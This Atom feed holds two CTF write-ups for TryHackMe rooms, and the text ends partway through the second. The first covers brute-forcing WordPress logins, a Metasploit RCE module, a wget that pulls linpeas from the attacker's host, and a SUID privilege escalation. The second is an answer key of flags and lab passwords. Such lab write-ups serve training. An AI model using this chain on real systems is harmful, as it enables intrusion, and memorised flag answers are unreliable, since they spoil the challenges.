<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-16T17:58:14+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ErrorCauser’s Write-Up’s</title><author><name>ErrorCauser</name></author><entry><title type="html">TryHackMe | Blog CTF</title><link href="http://localhost:4000/Blog/" rel="alternate" type="text/html" title="TryHackMe | Blog CTF" /><published>2020-07-16T00:00:00+02:00</published><updated>2020-07-16T00:00:00+02:00</updated><id>http://localhost:4000/Blog</id><content type="html" xml:base="http://localhost:4000/Blog/">&lt;p&gt;&lt;img src=&quot;http://growtowinmarketing.com/wp-content/uploads/2015/06/How-To-Write-a-WordPress-Post-7.png&quot; alt=&quot;wordpress-logo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello Guys!&lt;/p&gt;

&lt;p&gt;In this Post we will discuss the Blog CTF on TryHackMe.
At this point its a new Room (5 Days old).
In order to get the blog to work with AWS, you’ll need to add blog.thm 
to your /etc/hosts file.&lt;/p&gt;

&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/blog&quot;&gt;Blog&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulty: Medium&lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/Nameless0ne&quot;&gt;Nameless0ne&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;As always, I started by Enumerating the System.&lt;/p&gt;

&lt;p&gt;Nmap gor me the following Results:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733283213937606666/unknown.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Afterwards I ran enum4linux and Gobuster with the popular common.txt Wordlist.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733284680522137750/unknown.png&quot; alt=&quot;gobuster&quot; /&gt;
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733284876538740777/unknown.png&quot; alt=&quot;enum4linux&quot; /&gt;
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733285029433835520/unknown.png&quot; alt=&quot;enum4linux-nbt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Actual Site, we can also see two Names which we could use to Bruteforce a Password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733289155953688636/unknown.png&quot; alt=&quot;names&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used all Usernames I got up until that point, and made a custom Username-List. I simply changed the formats
from Names to usernames, for example:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bob johnson -&amp;gt; bob.johnson -&amp;gt; johnson.bob -&amp;gt; bob-johnson -&amp;gt; bob-johnson123 ...&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Thats what you could do on another Site. Since we got a Wordpress Site, we can use a Tool called &lt;strong&gt;wpsscan&lt;/strong&gt; to 
Enumerate Users and Dictionary Attack their Password with rockyou.txt.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[i] User(s) Identified:

[+] kwheel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bjoel
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blog.thm/wp-json/wp/v2/users/?per_page=100&amp;amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As I said before, from here you can use the Tool with the two found Usernames to Dicitonary attack the&lt;/p&gt;

&lt;p&gt;two Users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733316945226760292/unknown.png&quot; alt=&quot;attackingusers&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After getting the Password for one of the Users, you will get Access to the Panel. You have no rights&lt;/p&gt;

&lt;p&gt;to actually Post anything. We need to PrivEsc.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733317602692300830/unknown.png&quot; alt=&quot;panel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Since this is a outdated WordPress Version, I found a &lt;a href=&quot;https://www.exploit-db.com/exploits/46662&quot;&gt;Exploit&lt;/a&gt; for it.&lt;/p&gt;

&lt;p&gt;It has its own Metasploit Module in &lt;strong&gt;exploit/multi/http/wp_crop_rce&lt;/strong&gt;. As the Name says, its a RCE Exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733319786632708184/unknown.png&quot; alt=&quot;msfmodul&quot; /&gt;
&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733320446182817832/unknown.png&quot; alt=&quot;meterpreter&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, we gained a Meterpreter Session. We are currently &lt;strong&gt;www-data&lt;/strong&gt;. We have to PrivEsc again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733322172495298590/unknown.png&quot; alt=&quot;www-data&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I opened a Shell to navigate faster. I had to spawn the Bash Shell with the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733323150846066768/unknown.png&quot; alt=&quot;shelldrop&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The actual User Flag in /home/bjoe1 turns out to be a Fake User Flag.&lt;/p&gt;

&lt;p&gt;In order to PrivEsc the right way, I uploaded linpeas onto the System. I created a Python Web Server&lt;/p&gt;

&lt;p&gt;on my local Machine with the Command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 -m http.server [PORT]&lt;/code&gt;. The Webserver needs to be initialized
in the Folder, the File(s) you want to Download are stored. Afterwards I ran the Command
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget http://{IP}:{PORT}/linpeas.sh&lt;/code&gt; to Download the File. Make sure to be in a Direvtory where you are
able to Execute, /tmp is always a good one. Dont forget to give the File execute Perms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733328427846992012/unknown.png&quot; alt=&quot;linpease&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Linpease gave us the following SUID PriEsc Methods:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733333551696707656/unknown.png&quot; alt=&quot;privesclin&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I additionally ran the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find -perm -400 -ls 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733340159277531196/unknown.png&quot; alt=&quot;dev&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So as we can see, there is a weird “checker” Programm. After some basic Reverse Engeneering, I saw that I could
get Admin (UID 0) by setting up a new enviroment Variable.&lt;/p&gt;

&lt;p&gt;Ebviroment Variables are Variable which can be used everywhere, they simply store a string. The Program requires you
to have such a Variable “admin”.&lt;/p&gt;

&lt;p&gt;To create a new one you will have to aplly the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export admin=admin&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Afterwards you will be able to run the Script again and gain Root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/733349192449261628/unknown.png&quot; alt=&quot;root&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Credits go out to &lt;a href=&quot;https://tryhackme.com/p/power&quot;&gt;Power&lt;/a&gt;. He is part of the &lt;a href=&quot;https://discord.gg/RgBGcvz&quot;&gt;BayByte Team &lt;/a&gt; and helped 
me out with the PrivEsc!&lt;/p&gt;</content><author><name>ErrorCauser</name></author><summary type="html">Hello Guys! In this Post we will discuss the Blog CTF on TryHackMe. At this point its a new Room (5 Days old). In order to get the blog to work with AWS, you’ll need to add blog.thm to your /etc/hosts file. URL: Blog Difficulty: Medium Author: Nameless0ne</summary></entry><entry><title type="html">TryHackMe | Linux Challenge - Walktrough</title><link href="http://localhost:4000/Linux-Challenge/" rel="alternate" type="text/html" title="TryHackMe | Linux Challenge - Walktrough" /><published>2020-07-15T00:00:00+02:00</published><updated>2020-07-15T00:00:00+02:00</updated><id>http://localhost:4000/Linux-Challenge</id><content type="html" xml:base="http://localhost:4000/Linux-Challenge/">&lt;p&gt;&lt;img src=&quot;https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fhdqwalls.com%2Fwallpapers%2Flinux-tux-minimalism-4k-42.jpg&amp;amp;f=1&amp;amp;nofb=1&quot; alt=&quot;linuxlogo&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello Guys!&lt;/p&gt;

&lt;p&gt;Today we will discuss the Linux Challenge Walktrought Room on TryHackMe.com
This rooms purpose is to learn or improve your Linux skills.&lt;/p&gt;

&lt;p&gt;There will be challenges that will involve you using the following commands and techniques:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Using commands such as: ls, grep, cd, tail, head, curl, strings, tmux, find, locate, diff, tar, xxd
Understanding cronjobs, MOTD's and system mounts
SSH'ing to other users accounts using a password and private key
Locating files on the system hidden in different directories
Encoding methods (base64, hex)
MySQL database interaction
Using SCP to download a file
Understanding Linux system paths and system variables
Understanding file permissions
Using RDP for a GUI
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;URL: &lt;a href=&quot;https://tryhackme.com/room/linuxctf&quot;&gt;Linux Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Difficulty: Very Easy&lt;/p&gt;

&lt;p&gt;Author: &lt;a href=&quot;https://tryhackme.com/p/ben&quot;&gt;Ben&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 2-1: Garry’s Home Directory&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The first Task is to SSH into Garry’s System. We already got the SSH Credentials. In this Case the Command would be the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732925358155890748/unknown.png&quot; alt=&quot;ssh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, there are a Total of &lt;strong&gt;3 Files&lt;/strong&gt; in his Home Directory.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3: The Basics&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-1: Flag 1&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this Case, the Flag is in our Directory. We simply have to use the Command cat to Display it. In the File we also see the Login Credentials
for the User Bob.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732927712041238528/unknown.png&quot; alt=&quot;flag1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; f40dc0cff080ad38a6ba9a1c2c038b2c
&lt;strong&gt;Credentials:&lt;/strong&gt; bob:linuxrules&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-2: Flag 2&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We have the Login Credentials for Bob. We now open a SSH Session with Bob. the Second Flag is located in the /home Directory too.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732929173387083837/unknown.png&quot; alt=&quot;flag2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 8e255dfa51c9cce67420d2386cede596&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-3: Flag 3&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;strong&gt;ls -la&lt;/strong&gt; to Display all hidden files and Directorys.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732929921600454686/unknown.png&quot; alt=&quot;flag3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 9daf3281745c2d75fc6e992ccfdedfcd&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-4: Flag 4&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To identify this Flag, we needed a User defined Cronjob Command.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ crontab -e&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732931331650224158/unknown.png&quot; alt=&quot;flag4&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; dcd5d1dcfac0578c99b7e7a6437827f3&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-5: Flag 5&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We got the Hint to use the find Command, so the Command I used was the following:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ grep -rw &quot;flag5&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732933016875433994/unknown.png&quot; alt=&quot;flag5&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; bd8f33216075e5ba07c9ed41261d1703&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-6: Flag 6&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag requires a recursive search Command too. We got the Hint that the first two letters are “c9”.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ cat /home/flag6.txt | grep c9&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732934288395468821/unknown.png&quot; alt=&quot;flag6&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; c9e142a1e25b24a837b98db589b08be5&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-7: Flag 7&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We got a Hint, we should check the System Processes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732934996784054364/unknown.png&quot; alt=&quot;flag7&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 274adb75b337307bd57807c005ee6358&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-8: Flag 8&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The flag was zipped in a tar.gz format. I had to unzip it using the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;tar -xf flag8.tar.gz&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732936077333233734/unknown.png&quot; alt=&quot;flag8&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 75f5edb76fe98dd5fc9f577a3f5de9bc&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-9: Flag 9&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Hosts File is located in /etc/hosts&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732937393149182022/unknown.png&quot; alt=&quot;flag9&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; dcf50ad844f9fe06339041ccc0d6e280&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 3-10: Flag 10&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We got told to check other Users on the System (passwd).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732937731512074321/unknown.png&quot; alt=&quot;flag10&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 5e23deecfe3a7292970ee48ff1b6d00c&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-1: Flag 11&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag was stored in the .bashrc file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732939553417199616/unknown.png&quot; alt=&quot;flag11&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; b4ba05d85801f62c4c0d05d3a76432e0&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-2: Flag 12&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The Hint we got, tells us that this Flag is stored where MOTD Files are stored. Thoose Files Display Messages
or even Pictures on the Terminal. Thoose Files are stored under &lt;strong&gt;/etc/update-m,otd.d&lt;/strong&gt;, we are searching for
the 00-header File.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732941568880803910/unknown.png&quot; alt=&quot;flag12&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 01687f0c5e63382f1c9cc783ad44ff7f&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-3: Flag 13&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Requires a &lt;strong&gt;different&lt;/strong&gt; Command.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ diff flag13/script1 flag13/script2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732942449030332436/unknown.png&quot; alt=&quot;flag13&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 3383f3771ba86b1ed9ab7fbf8abab531&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-4: Flag 14&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Logs are mostly stored in the Directory &lt;strong&gt;/var/log&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732943686823968808/unknown.png&quot; alt=&quot;flag14&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 71c3a8ad9752666275dadf62a93ef393&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-5: Flag 15&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Such Informations can be found in the Directory &lt;strong&gt;/etc/*release&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732944546132131931/unknown.png&quot; alt=&quot;flag15&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; a914945a4b2b5e934ae06ad6f9c6be45&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-6: Flag 16&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Mounts are usually displayed in &lt;strong&gt;/mount&lt;/strong&gt;. This one was a bad one.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732945386393829455/unknown.png&quot; alt=&quot;flag16&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; cab4b7cae33c87794d82efa1e7f834e6&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-7: Flag 17&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We now have to log into the User &lt;strong&gt;Alice&lt;/strong&gt;, her Password is &lt;strong&gt;TryHackMe123&lt;/strong&gt;.
The Flag was right in the /home Directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732946118970834984/unknown.png&quot; alt=&quot;flag17&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer&lt;/strong&gt;: 89d7bce9d0bab49e11e194b54a601362&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-8: Flag 18&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag was just a hidden File.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732946445073645620/unknown.png&quot; alt=&quot;flag18&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; c6522bb26600d30254549b6574d2cef2&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-9: Flag 19&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To read a specific Line of a File, we will need to use the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sed -n 2345p flag19&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732947102425940068/unknown.png&quot; alt=&quot;flag19&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 490e69bd1bf3fc736cce9ff300653a3b&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-1: Flag 20&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag requires to be Base64 Decoded.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ cat flag20 | base64 --decode&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732948101769330718/unknown.png&quot; alt=&quot;flag20&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 02b9aab8a29970db08ec77ae425f6e68&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-2: Flag 21&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We will need to inspect the File with &lt;strong&gt;less&lt;/strong&gt; instead of &lt;strong&gt;cat&lt;/strong&gt; since its a .php File. 
The File in inside Bob’s Home Directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732949056019759264/unknown.png&quot; alt=&quot;flag21&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; g00djob&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-3: Flag 22&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag is in Hex, we convert it into ASCII with the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ cat flag22 | xxd -r -p&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732950061746749461/unknown.png&quot; alt=&quot;flag22&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 9d1ae8d569c83e03d8a8f61568a0fa7d&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-4: Flag 23&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This Flag is located in /home/alice. it requires a text reverse Command.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ cat flag23|rev&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732951150491598888/unknown.png&quot; alt=&quot;flag23&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; ea52970566f4c090a7348b033852bff5&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-5: Flag 24&lt;/strong&gt;
In order to Display readable Strings, we need to use the following Command:
The Flag is located in the Directory &lt;strong&gt;/home/garry&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ strings /home/garry/flag24&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732952286594072704/unknown.png&quot; alt=&quot;flag24&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; hidd3nStr1ng&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-7: Flag 26&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To find this Flag, insert the Command below.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -xdev -type f -print0 2&amp;gt;/dev/null | xargs -0 grep -E '^[a-z0-9]{32}$' 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732954782779834518/unknown.png&quot; alt=&quot;flag26&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 4bceb76f490b24ed577d704c24d6955d&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-8: Flag 27&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We got Permissions to view the File.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732955659489902643/unknown.png&quot; alt=&quot;flag27&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 6fc0c805702baebb0ecc01ae9e5a0db5&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-9: Kernel Version&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In order to get the Kernel Version, we use the Command below.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ uname -a&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732956322798239764/unknown.png&quot; alt=&quot;kernel&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; 4.4.0-1075-aws&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 4-10: Flag 29&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Follow the Steps below.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ cat flag29 | tr -d ' ' &amp;gt;flag29_noS
$ cat flag29_noS | tr -d '/n' &amp;gt;flag29_noSN
$ cat flag29_noSN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; fastidiisuscipitmeaei&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-1: Flag 30&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In order to get that Flag, I curled localhost.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ curl localhost&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://cdn.discordapp.com/attachments/723180241140318278/732958088306622524/unknown.png&quot; alt=&quot;flag30&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Answer:&lt;/strong&gt; fe74bb12fe03c5d8dfc245bdd1eae13f&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Task 6-2: Flag 31&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;We got MySQL Credentials. We log in into the MySQL Databse with the following Command:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ mysql -u root -p&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Afterwards we will type in &lt;strong&gt;SHOW DATABASES;&lt;/strong&gt; in order to check all avaible Databases.&lt;/p&gt;

